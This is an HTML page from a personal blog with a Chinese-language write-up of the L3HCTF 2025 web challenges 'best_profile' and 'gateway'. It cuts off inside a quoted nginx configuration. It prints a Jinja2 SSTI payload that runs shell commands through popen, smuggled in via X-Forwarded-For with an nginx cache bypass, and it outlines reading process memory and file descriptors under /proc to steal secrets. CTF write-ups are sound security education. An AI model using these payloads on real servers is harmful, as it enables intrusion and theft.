@@ -1,0 +1,936 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="xiaolaisec">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://laijunyue.github.io/2025/07/15/l3hctf2025wp/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="WEBbest_profile思路1234567891011漏洞点主要是&#x2F;ip_detail&#x2F;&lt;string:username&gt;路由下的render_template_string(template)进行SSTI关键点是需要绕过requests.get(f&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;get_last_ip&#x2F;&amp;#123;username&amp;#125;&quot;)请求时不">
+<meta property="og:type" content="article">
+<meta property="og:title" content="L3HCTF2025WP">
+<meta property="og:url" content="http://laijunyue.github.io/2025/07/15/L3HCTF2025WP/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="WEBbest_profile思路1234567891011漏洞点主要是&#x2F;ip_detail&#x2F;&lt;string:username&gt;路由下的render_template_string(template)进行SSTI关键点是需要绕过requests.get(f&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;get_last_ip&#x2F;&amp;#123;username&amp;#125;&quot;)请求时不">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:\Users\27284\AppData\Roaming\Typora\typora-user-images\image-20250819153743207.png">
+<meta property="og:image" content="c:\Users\27284\AppData\Roaming\Typora\typora-user-images\image-20250819153847837.png">
+<meta property="og:image" content="c:\Users\27284\AppData\Roaming\Typora\typora-user-images\image-20250819153834100.png">
+<meta property="og:image" content="c:\Users\27284\AppData\Roaming\Typora\typora-user-images\image-20250819153908850.png">
+<meta property="og:image" content="c:\Users\27284\AppData\Roaming\Typora\typora-user-images\image-20250819154012443.png">
+<meta property="article:published_time" content="2025-07-15T11:07:05.000Z">
+<meta property="article:modified_time" content="2025-08-19T10:27:22.925Z">
+<meta property="article:author" content="xiaolaisec">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="JAVA">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:\Users\27284\AppData\Roaming\Typora\typora-user-images\image-20250819153743207.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            L3HCTF2025WP -
+        
+        Welcome to xiaolaisec&#39;s blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Welcome to xiaolaisec&#39;s blog
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"laijunyue.github.io","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","delete_mask":false,"headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null},"highlight_theme":{"light":"github","dark":"vs2015"}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]},"pangu_js":false},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null},"side_tools":{"gear_rotation":true,"auto_expand":false}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"xiaolaisec's blog","subtitle":{"text":["随心所欲地享受每一天\\(￣︶￣*\\))","随时随地，浏览记录O(∩_∩)O","如果喜欢，建议给个支持( •̀ ω •́ )✧","喜欢的话，留个言好嘛(oﾟvﾟ)ノ","你有建议？反馈作者(●^◡^●)","欢迎来到我的博客(｡･∀･)ﾉﾞ","文字正在不断轮换(*￣3￣)╭","正在努力更新博客(ง •_•)ง","正在不断努力改善博客中ε=( o｀ω′)ノ"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn","show_author":false},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null},"style":"default"}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.6.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true},"width":{"home":"1200px","pages":"1000px"}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null,"show_on_mobile":true},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3},"excerpt_length":200},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Welcome to xiaolaisec&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">L3HCTF2025WP</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/redefine-avatar.svg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">xiaolaisec</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-07-15 19:07:05</span>
+        <span class="mobile">2025-07-15 19:07:05</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-08-19 18:27:22</span>
+            <span class="mobile">2025-08-19 18:27:22</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/JAVA/">JAVA</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/PHP/">PHP</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Python/">Python</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="best-profile"><a href="#best-profile" class="headerlink" title="best_profile"></a>best_profile</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">漏洞点主要是/ip_detail/&lt;string:username&gt;路由下的render_template_string(template)进行SSTI</span><br><span class="line">关键点是需要绕过requests.get(f&quot;http://127.0.0.1/get_last_ip/&#123;username&#125;&quot;)请求时不会带上cookie，导致return&quot;You need to login first.&quot;而无法进行SSTI，但是可以通过nginx.conf对gif|jpg|jpeg|png|bmp|swf后缀文件的缓存功能进行绕过</span><br><span class="line"></span><br><span class="line">注册一个带有带有gif|jpg|jpeg|png|bmp|swf后缀的用户，如1.gif</span><br><span class="line">构造XFF为&#123;&#123;7*7&#125;&#125;，先访问/1.gif就会将XFF写入缓存，然后再访问/get_last_ip/1.gif你的IP就变成&#123;&#123;7*7&#125;&#125;了</span><br><span class="line">之后访问/ip_detail/1.gif，由于缓存机制，在访问的时候就会直接访问本地缓存(含cookie)进而绕过未授权打SSTI了</span><br><span class="line"></span><br><span class="line">要注意payload不能有引号&#x27;&#x27;，用request.args绕过</span><br><span class="line">&#123;&#123;lipsum.__globals__[request.args.x1].popen(request.args.x2).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">太懒了，不想本地复现，下面贴一下别人的WP</span><br></pre></td></tr></table></figure></div>
+
+<p>先分析源码，发现在<code>app.py</code>中存在如下代码</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/get_last_ip/&lt;string:username&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">route_check_ip</span>(<span class="params">username</span>):</span><br><span class="line">    ifnot current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span><span class="string">&quot;You need to login first.&quot;</span></span><br><span class="line">    user = User.query.filter_by(username=username).first()</span><br><span class="line">    ifnot user:</span><br><span class="line">        <span class="keyword">return</span><span class="string">&quot;User not found.&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;last_ip.html&quot;</span>, last_ip=user.last_ip)</span><br><span class="line"></span><br><span class="line">geoip2_reader = geoip2.database.Reader(<span class="string">&quot;GeoLite2-Country.mmdb&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/ip_detail/&lt;string:username&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">route_ip_detail</span>(<span class="params">username</span>):</span><br><span class="line">    res = requests.get(<span class="string">f&quot;http://127.0.0.1/get_last_ip/<span class="subst">&#123;username&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> res.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span><span class="string">&quot;Get last ip failed.&quot;</span></span><br><span class="line">    last_ip = res.text</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip = re.findall(<span class="string">r&quot;\d+\.\d+\.\d+\.\d+&quot;</span>, last_ip)</span><br><span class="line">        country = geoip2_reader.country(ip)</span><br><span class="line">    <span class="keyword">except</span> (ValueError, TypeError):</span><br><span class="line">        country = <span class="string">&quot;Unknown&quot;</span></span><br><span class="line">    template = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;IP Detail&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;div&gt;<span class="subst">&#123;last_ip&#125;</span>&lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;Country:<span class="subst">&#123;country&#125;</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_last_ip</span>(<span class="params">response</span>):</span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        current_user.last_ip = request.remote_addr</span><br><span class="line">        db.session.commit()</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure></div>
+
+<p>这里逻辑是先访问<code>http://127.0.0.1/get_last_ip/&#123;username&#125;</code>，将获得的<code>res.text</code>进行了模板渲染，可以在这里构造<code>ssti</code>。根据最后的<code>set_last_ip()</code>可知<code>last_ip</code>可以通过<code>XFF</code>获取，主要问题就是<code>request.get</code>请求时不会带上<code>session</code>访问，导致每次访问都是<code>You need to login first.</code></p>
+<p>注意到<code>nginx.conf</code>中代码</p>
+<div class="highlight-container" data-rel="Css"><figure class="iseeu highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$ &#123;</span><br><span class="line">    proxy_ignore_headers Cache-Control Expires Vary Set-Cookie;</span><br><span class="line">    proxy_pass http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">5000</span>;</span><br><span class="line">    proxy_cache static;</span><br><span class="line">    proxy_cache_valid <span class="number">200</span> <span class="number">302</span> <span class="number">30</span>d;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>在处理这些后缀的文件时，会缓存在本地，所以在请求时就不会调用<code>flask</code>应用而是直接调用本地缓存文件，那么这样就避免了未授权问题。</p>
+<p>首先正常注册登录，<code>username</code>为<code>2.swf</code>(列表中任意后缀即可)，进了主页之后访问<code>get_last_ip/2.swf</code>，先抓包加上<code>XFF</code>访问一个错误的路由，触发<code>set_last_ip()</code>，注意这里是由于缓存机制，所以是一次性的，如果操作错了就只有重新注册登录。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:\Users\27284\AppData\Roaming\Typora\typora-user-images\image-20250819153743207.png"
+                      alt="image-20250819153743207"
+                ></p>
+<p>然后用正确的路由重新访问一次，让<code>XFF</code>进入<code>last_ip</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:\Users\27284\AppData\Roaming\Typora\typora-user-images\image-20250819153847837.png"
+                      alt="image-20250819153847837"
+                ></p>
+<p>这样<code>last_ip</code>就设置好了，访问<code>ip_detail/2.swf</code>就能成功渲染，之后同理即可</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:\Users\27284\AppData\Roaming\Typora\typora-user-images\image-20250819153834100.png"
+                      alt="image-20250819153834100"
+                ></p>
+<p>在进行<code>ssti</code>时测出来过滤了<code>&#39;&#39;</code>，request.args旁路注入绕过</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:&#123;&#123;lipsum.__globals__[request.args.a].popen(request.args.b).read()&#125;&#125;</span><br><span class="line">/ip_detail/1.swf</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:\Users\27284\AppData\Roaming\Typora\typora-user-images\image-20250819153908850.png"
+                      alt="image-20250819153908850"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:\Users\27284\AppData\Roaming\Typora\typora-user-images\image-20250819154012443.png"
+                      alt="image-20250819154012443"
+                ></p>
+<h2 id="gateway"><a href="#gateway" class="headerlink" title="gateway"></a>gateway</h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">主要看nginx.conf，漏洞点是/download路由中的ngx.req.get_uri_args()存在绕过第一层的黑名单&#123;&quot;%.&quot;, &quot;/&quot;, &quot;;&quot;, &quot;flag&quot;, &quot;proc&quot;&#125;进而可以读取别的文件，不能读flag，因为flag在内存中而不在文件里；</span><br><span class="line">参考：https://github.com/openresty/openresty/issues/358</span><br><span class="line"></span><br><span class="line">另外就是当读取文件里的内容中含有&#123;&quot;flag&quot;, &quot;l3hsec&quot;, &quot;l3hctf&quot;, &quot;password&quot;, &quot;secret&quot;, &quot;confidential&quot;&#125;时会将其替换为*，这时候需要用Range(Range: bytes=0-5)进行截断读取password，这里有个细节，password从/password文件读取后并未进行f2:close()操作，所以可以通过读/proc/self/fd/n找到password文件进程来获取password</span><br><span class="line"></span><br><span class="line">得到password后最后通过/read_anywhere读/proc/self/maps，/proc/self/mem内存段找flag</span><br></pre></td></tr></table></figure></div>
+
+<p>nginx.conf</p>
+<div class="highlight-container" data-rel="Css"><figure class="iseeu highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">worker_processes <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    use epoll;</span><br><span class="line">    worker_connections <span class="number">10240</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include mime<span class="selector-class">.types</span>;</span><br><span class="line">    default_type text/<span class="selector-tag">html</span>;</span><br><span class="line">    access_log off;</span><br><span class="line">    error_log /dev/null;</span><br><span class="line">    sendfile on;</span><br><span class="line"></span><br><span class="line">    init_by_lua_block &#123;</span><br><span class="line">        f = io<span class="selector-class">.open</span>(&quot;/flag&quot;, &quot;r&quot;)</span><br><span class="line">        f2 = io<span class="selector-class">.open</span>(&quot;/password&quot;, &quot;r&quot;)</span><br><span class="line">        flag = f:<span class="built_in">read</span>(<span class="string">&quot;*all&quot;</span>)</span><br><span class="line">        password = f2:<span class="built_in">read</span>(<span class="string">&quot;*all&quot;</span>)</span><br><span class="line">        f:<span 